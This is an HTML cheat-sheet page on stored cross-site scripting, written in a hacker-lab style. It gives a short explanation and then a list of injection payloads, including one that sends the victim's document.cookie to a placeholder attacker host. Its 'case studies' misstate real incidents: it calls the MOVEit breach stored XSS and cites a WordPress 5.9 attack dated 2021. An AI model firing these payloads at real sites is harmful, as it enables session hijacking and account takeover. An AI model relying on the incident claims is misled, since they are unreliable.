<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stored XSS</title>
    <style>
        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
        *{box-sizing:border-box;margin:0;padding:0;}
        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
        .bar span{color:var(--accent);}
        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
    </style>
</head>
<body>
<div class="bar"><span>user@lab</span><span>~/xss/04-stored-xss</span></div>
<main class="wrap">
    <h1>Stored XSS</h1>

    <h2>What it is</h2>
    <p>Payload is saved server-side (DB, log, file) and later rendered for other users. Persistent until deleted.</p>

    <h2>Why it happens</h2>
    <p>Insert = no filter, Select = no encoding. ORM “save()” blindly stores, template “{{}}” blindly prints.</p>

    <h2>Where you’ll meet it</h2>
    <p>Comments, reviews, usernames, avatars (EXIF), chat messages, CSV imports, WebSocket broadcasts, even HTTP User-Agent logs.</p>

    <h2>Impact</h2>
    <p>Self-spreading worm, admin takeover, supply-chain back-door (see 2023 MOVEit stored XSS → code execution).</p>

    <h2>Mini case-study</h2>
    <p>2021 WordPress 5.9 comment reply → stored XSS auto-ran in admin dashboard → 4.3 M sites affected.</p>

    <h2>Payloads</h2>
    <!-- JSON stored -->
    <pre><code>// JSON profile field later rendered raw
{"nick":"&lt;/script&gt;&lt;svg onload=eval(name)&gt;"}</code></pre>

    <!-- EXIF UTF-7 -->
    <pre><code>// UTF-7 BOM inside EXIF UserComment
+ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre>

    <!-- Markdown footnote -->
    <pre><code>// Many MD renderers allow HTML in footnotes
Some text[^1]
[^1]: &lt;iframe src="javascript:alert(1)"&gt;</code></pre>

    <!-- WebSocket broadcast -->
    <pre><code>// Server rebroadcasts to all clients
ws.send(JSON.stringify({msg:'&lt;img src=x onerror=alert(1)&gt;'}))</code></pre>

    <!-- CSV → Excel → JS -->
    <pre><code>// Excel opens CSV → HTML in cell → IE engine runs
=HYPERLINK("https://att","Click")&"&lt;img src=x onerror=alert(1)&gt;"</code></pre>

    <!-- Blind out-of-band -->
    <pre><code>// No visual but cookie arrives
&lt;img src="https://att/x.gif?c=document.cookie" onerror="fetch('//att/log?c='+document.cookie)"&gt;</code></pre>

</main>
<footer><span>EOF ── happy hacking :)</span></footer>
</body>
</html>